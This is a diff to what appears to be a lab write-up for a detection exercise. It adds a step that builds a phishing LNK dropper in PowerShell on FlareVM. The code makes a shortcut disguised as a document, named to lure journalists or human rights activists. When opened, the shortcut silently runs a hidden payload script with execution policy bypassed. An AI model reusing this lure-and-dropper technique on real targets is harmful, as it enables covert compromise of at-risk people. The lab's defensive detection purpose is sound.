@@ -96,4 +96,48 @@ Get-Item $payloadPath
 > specifically because it rarely gets scrutinised. This is what the
 > MFT and Prefetch artifacts will catch in the detection phase.
 
+![Payload Created](../screenshots/phase3-01-payload-created.png)
+
+---
+
+## Step 3 - Create the LNK Dropper
+
+The LNK file simulates the phishing lure - a shortcut that appears
+to be a document but silently executes the payload when opened.
+
+The filename is crafted to target a journalist or human rights
+activist. Access Now was founded in 2009 in direct response to
+the Iranian presidential election and the human rights abuses that
+followed. A file named after that event is exactly what a targeted
+person would open without hesitation.
+
+On FlareVM, open PowerShell as Administrator:
+
+```powershell
+$shell = New-Object -ComObject WScript.Shell
+
+$lnkPath = "$env:USERPROFILE\Desktop\Iran-Election-2009-Witness-Testimonies.lnk"
+$lnk = $shell.CreateShortcut($lnkPath)
+
+$lnk.TargetPath = "powershell.exe"
+$lnk.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\payload.ps1"'
+$lnk.IconLocation = "C:\Windows\System32\shell32.dll,1"
+$lnk.Description = "Iran Election 2009 Witness Testimonies"
+$lnk.Save()
+
+Get-Item $lnkPath
+```
+
+Expected output:
+
+```powershell
+    Directory: C:\Users\acrkmr\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        13/09/2026     20:34           2052 Iran-Election-2009-Witness-Testimonies.lnk
+```
+
+![LNK Created](../screenshots/phase3-02-lnk-created.png)
+
 ---
